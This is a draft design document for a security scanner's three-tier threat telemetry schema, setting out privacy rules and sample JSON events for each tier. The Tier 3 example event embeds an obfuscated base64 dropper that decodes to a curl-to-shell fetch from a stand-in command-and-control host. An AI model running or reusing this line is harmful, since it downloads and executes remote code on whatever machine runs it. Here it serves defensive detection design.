# Sentinel Intelligence Bridge: Data Privacy & Telemetry Schema
**Status:** DRAFT (Pre-implementation)
**Classification:** Internal Architecture

## Core Directives

The Intelligence Bridge is the mechanism by which local CLI scans report threat data back to the `sentinel-cloud` SaaS backend. To prevent legal liability, compliance violations, and repository data leakage, Sentinel enforces a strict **Three-Tier Data Schema**.

### Directive 1: Default-Deny
- `INTELLIGENCE_OPT_IN` is strictly `false` by default.
- Users must explicitly flag `--opt-in-telemetry` or accept via the SaaS dashboard.

### Directive 2: Zero-Path Exposure
- Absolute file paths (e.g., `/Users/dev/company-secrets/core/auth.js`) are **NEVER** transmitted.
- Only relative basenames or file extensions are sent (e.g., `.js`, `package.json`).

### Directive 3: No Raw Payloads Without Enterprise Contract
- Raw source code snippets or AST structures are strictly prohibited in Tiers 1 and 2. 

---

## 📊 The 3-Tier Schema Definition

### 🟢 Level 1: Public / Aggregated (FREE TIER)
Used for the Public Threat Feed, X (Twitter) Bot, and general statistics.
**What goes in:** Purely categorical metadata.
**What stays out:** No code, no filenames, no user identifiers.

```json
{
  "event_id": "uuid",
  "timestamp": "2026-04-25T10:00:00Z",
  "tier": 1,
  "threat_category": "SUPPLY_CHAIN",
  "detection_pattern": "obfuscated_install_script",
  "risk_score": 0.95,
  "sandbox_triggered": true,
  "sandbox_action": "network_call_blocked",
  "compute_ms": 450
}
```

### 🟡 Level 2: Tokenized / Heuristic (PRO TIER)
Used internally by our AI models to recognize emerging attack patterns without seeing proprietary logic.
**What goes in:** Tokenized structures, AST shapes, Shannon Entropy values.
**What stays out:** Raw strings, proprietary variable names, secrets.

```json
{
  "event_id": "uuid",
  "timestamp": "2026-04-25T10:00:00Z",
  "tier": 2,
  "file_context": {
    "extension": ".js",
    "directory_type": "vendor",
    "entropy": 6.8
  },
  "ast_shape": "CallExpression(MemberExpression(Buffer, from), Literal(base64))",
  "risk_score": 0.95,
  "sandbox_triggered": true
}
```

### 🔴 Level 3: Full Payload (ENTERPRISE ONLY)
Used ONLY when an Enterprise customer explicitly signs a "Threat Intelligence Sharing Agreement" to allow Sentinel analysts and advanced AI models to study zero-day droppers found in their environments.
**What goes in:** The raw malicious snippet.
**What stays out:** The rest of the repository. Only the specific line range triggering the `0.95+` score is sent.

```json
{
  "event_id": "uuid",
  "timestamp": "2026-04-25T10:00:00Z",
  "tier": 3,
  "enterprise_id": "ent_uuid",
  "raw_payload": "eval(Buffer.from('Y3VybCBodHRwOi8vYzIueHl6L2Ryb3AgfCBzaA==', 'base64').toString())",
  "forensic_context": {
    "author_trust_score": 1.0,
    "commit_hash": "a1b2c3d"
  }
}
```

---
**Architectural Rule:** The `cli_gate.js` and `index.js` orchestrators MUST pass their results through a `Sanitizer Module` before making any external HTTP POST request to the Intelligence Bridge.
